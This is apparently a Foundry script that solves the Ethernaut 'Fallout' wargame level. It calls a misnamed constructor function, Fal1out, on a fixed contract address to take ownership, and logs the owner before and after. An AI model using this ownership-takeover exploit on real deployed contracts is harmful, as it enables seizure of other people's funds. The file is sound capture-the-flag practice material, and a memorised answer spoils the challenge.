// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {
    Fallout public fallout =
        Fallout(0x432229231766F8621C4E2db7Fb92EAAee6D2f597);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log(fallout.owner());
        fallout.Fal1out{value: 1 wei}();
        console.log(fallout.owner());
        vm.stopBroadcast();
    }
}
